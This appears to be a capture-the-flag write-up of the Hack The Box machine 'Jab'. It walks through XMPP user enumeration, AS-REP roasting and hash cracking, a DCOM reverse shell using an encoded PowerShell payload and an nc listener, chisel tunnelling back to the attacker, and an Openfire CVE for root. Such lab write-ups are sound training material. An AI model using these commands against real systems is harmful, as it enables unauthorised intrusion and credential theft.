![Jab](https://github.com/amalcew/htb-writeups/assets/73908014/cb89fa9a-f89d-4580-aa09-957fca449262)

## Reconnaissance & port scanning

Starting with basic enumeration in nmap: 

```bash
nmap 10.10.11.4    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 12:34 CEST
Nmap scan report for jab.htb (10.10.11.4)
Host is up (0.024s latency).
Not shown: 984 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5222/tcp open  xmpp-client
5269/tcp open  xmpp-server
7070/tcp open  realserver
7443/tcp open  oracleas-https
7777/tcp open  cbt

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

The target has multiple open ports including ports used by `xmpp` server and client. XMPP is a message protocol standard - on Linux, one of the clients that allow to connect to the server ant utilize the standard is called **Pidgin**

Once the Pidgin is installed, we can try to connect to the target and register account:

![01-initial](https://github.com/amalcew/htb-writeups/assets/73908014/c2aa6c56-7781-4077-b654-301375f0e9ee)

![02-register](https://github.com/amalcew/htb-writeups/assets/73908014/c30f04d5-87ab-49a6-9612-6d8a250942c6)

After registration, we can get a room list:

![03-room_list](https://github.com/amalcew/htb-writeups/assets/73908014/ad741a3b-b3dc-44ff-8bc1-716cd9912d47)

![04-room_list2](https://github.com/amalcew/htb-writeups/assets/73908014/f17486a9-b299-45cd-9229-34e6ed0629b1)

There are two rooms, one that is accessible and one that cannot be connected to. Further enumeration of the service leads to AD user enumeration:

![05-user_enum](https://github.com/amalcew/htb-writeups/assets/73908014/8b005496-064a-4efc-bfbd-d2f334412279)

Running this query will return all users:

![06-user_enum2_defaced](https://github.com/amalcew/htb-writeups/assets/73908014/96125387-88b6-46d8-9542-7c3ceae32a31)

Running the `pidgin -d` it is possible to retrieve text-based results of the query, that will be handy during the initial foothold.

![07-user_enum3_defaced](https://github.com/amalcew/htb-writeups/assets/73908014/4edd57e7-3696-48a6-bc36-6d4e908055eb)

## Initial foothold

### AS-REP Roasting

As the target machinhe runs Kerberos, it is obvious that it utilizes some kind of Active Directory mechanic. Having the results of user enumeration query stored as .xml, it is possible to retrieve only usernames, using simple Python script:

```python
#!/usr/bin/python

import re

pattern = re.compile(r'<value>([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)</value>')
file_path = 'users.xml'

emails = []
with open(file_path, 'r', encoding='utf-8') as file:
    while True:
        chunk = file.read(1024 * 1024)  # Read 1 MB at a time
        if not chunk:
            break
        emails.extend(pattern.findall(chunk))

with open('users_filtered.txt', 'w') as file:
    for email in list(set(emails)):
        file.write(f"{email.split('@jab.htb')[0]}\n")
```

Having the username list, I've run AS-REP roasting attack against the Kerberos:

```bash
> python GetNPUsers.py jab.htb/ -usersfile users_filtered.txt -format hashcat -outputfile hashes.asreproast
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User ***** doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ***** doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ***** doesn't have UF_DONT_REQUIRE_PREAUTH set

... SNIP ...

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$******@JAB.HTB:be83...SNIP...6c06
[-] User ***** doesn't have UF_DONT_REQUIRE_PREAUTH set

... SNIP ...
```

One of the retrieved hash is crackable:

```john
> john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
M*********1     ($krb5asrep$23$**********@JAB.HTB)     
1g 0:00:00:13 DONE (2024-06-24 13:06) 0.07457g/s 1069Kp/s 2946Kc/s 2946KC/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Using this password, we can log in as the user `jmontgomery`. After scanning for the available rooms, we discover a room called `pentest2003`:

![08-additional_room](https://github.com/amalcew/htb-writeups/assets/73908014/ed75a470-7486-456c-8a16-476ba7ae5e65)

Further inspection of the chat discloses a account named `svc_openfire` and hash-password value of the account.

![09-svc_openfire_defaced](https://github.com/amalcew/htb-writeups/assets/73908014/03045c37-0e5c-407d-ab63-a8c6dc26f354)

### ExecuteDCOM

As we have the password of the service account, we can try to enumerate the Active Directory, by using `bloodhound-python` ingestor:

```bash
bloodhound-python -u 'svc_openfire' -p '*******' -d jab.htb -dc DC01.jab.htb -c all -ns 10.10.11.4
```

And analyze the results of the enumeration inside `Bloodhound`:

![10-bloodhound](https://github.com/amalcew/htb-writeups/assets/73908014/802476a2-d734-4985-ad57-998a17040508)

As we can see, we can exploit the `ExecuteDCOM` functionality of the target machine, which will allow us to gain reverse shell on the target.

After crafting the payload, we are ready to go:

```bash
> python dcomexec.py -object MMC20 jab.htb/svc_openfire:'*******'@10.10.11.4 'cmd.exe /c powershell -e JABjAGwA...SNIP...KAApAA==' -silentcommand
Impacket v0.11.0 - Copyright 2023 Fortra
```

```bash
> nc -lnvp 1234  
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.4] 51723
whoami
jab\svc_openfire
PS C:\windows\system32>
```

Acquired user flag :
```
PS C:\Users\svc_openfire\Desktop> ls


    Directory: C:\Users\svc_openfire\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        6/24/2024  12:01 AM             34 user.txt                                                              


PS C:\Users\svc_openfire\Desktop> type user.txt 
818a************************04d8
```

## Privileges escalation

Internal enumeration of the host's ports discovered, that the target is hosting `openfire` server on ports 9090 and 9091:

```bash
PS C:\Users\svc_openfire\Desktop> netstat -ano | findstr '127.0.0.1:'
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2540
  TCP    127.0.0.1:389          127.0.0.1:49779        ESTABLISHED     636
  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       812
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       812

  ...SNIP...
```

As the Windows does not utilize ssh, we will need other means to forward ports to the attacker machine. We can use `chisel` to do this.

After transfering the `chisel` to the target, we execute the server and client commands on the attacker and target:

Attacker:
```bash
chisel server -p 1234 --reverse
```

Target:
```bash
chisel client xx.xx.xx.xx:1234 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
```

Opening the `localhost:9090` in the browser will greet us with login page:

![11-openfire](https://github.com/amalcew/htb-writeups/assets/73908014/018297ba-9f27-40c3-8270-1b73bc768b97)

After logging with the `svc_openfire` credentials, we are logged into the system:

![12-openfire2](https://github.com/amalcew/htb-writeups/assets/73908014/51147a87-cf43-4769-be11-82e656a24d73)

Further exploration of the panel revealed, that the service is vulnerable to [CVE-2023-32315](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce). Following the instructions and crafting the payload allows to leverage the vulnerability and gain root access over the target.

![13-root](https://github.com/amalcew/htb-writeups/assets/73908014/e708f4af-9041-49b4-8930-bc21e2318c2e)
